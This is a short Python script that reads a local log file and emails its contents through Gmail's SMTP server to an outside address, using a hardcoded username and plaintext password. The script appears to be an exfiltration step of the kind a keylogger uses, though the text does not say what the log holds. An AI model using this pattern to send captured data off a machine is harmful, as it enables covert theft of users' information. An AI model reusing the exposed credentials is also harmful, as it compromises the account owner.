import smtplib
import filemanager

def main():
    sender = "didlaak6000@gmail.com"
    receiver = "didlaak6000@naver.com"
    username = "didlaak6000"
    password = "alvrbqh95"

    log = open(filemanager.getlogfilepath(filemanager.getlogfilename()), mode = 'r', encoding="utf-8").read().encode()

    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login(username, password)
    server.sendmail(sender, receiver, log)
    server.quit()
    